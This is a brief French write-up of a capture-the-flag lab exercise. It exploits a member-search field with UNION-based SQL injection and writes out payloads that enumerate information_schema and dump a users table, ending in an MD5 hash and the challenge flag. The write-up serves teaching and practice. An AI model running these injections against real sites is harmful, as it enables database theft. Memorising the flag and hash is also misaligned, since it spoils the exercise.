
En ouvrant la page index.php?page=member
on dispose d’un champ permettant de rechercher un utilisateur via son ID. Les premiers essais ne donnent rien, mais l’ID 5 renvoie :
First name : Flag
Surname : GetThe

Une tentative d’injection :
5 UNION SELECT 1
génère une erreur indiquant que le nombre de colonnes ne correspond pas ce qui confirme que l’injection est bien prise en compte. 
Une fois le nombre correct de colonnes identifié, on peut récupérer la liste des tables et des colonnes :
5 UNION SELECT table_name, column_name FROM information_schema.columns
On y repère la table users.
En affichant son contenu :
5 UNION SELECT Commentaire, countersign FROM users
le dernier utilisateur révèle un hash MD5 :
5ff9d0165b4f92b14994e5c685cdce28

flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
<img width="1085" height="682" alt="Image" src="https://github.com/user-attachments/assets/f570850c-eda0-4b84-8d4d-d4bacdb5c79f" />
<img width="981" height="465" alt="Image" src="https://github.com/user-attachments/assets/d40bad1f-ada5-4c69-943e-bbb3d3f396b4" />
<img width="983" height="744" alt="Image" src="https://github.com/user-attachments/assets/f9a4f87e-15cd-426b-bda5-708e8d588ab8" />
<img width="701" height="792" alt="Image" src="https://github.com/user-attachments/assets/cda674ae-2df8-4d65-b0e3-8256b391b66e" />
<img width="1179" height="565" alt="Image" src="https://github.com/user-attachments/assets/545b4995-5a57-4c26-86f4-04e9009aefef" />
<img width="1544" height="410" alt="Image" src="https://github.com/user-attachments/assets/63c079ab-5996-423e-a150-4b4e23369e67" />
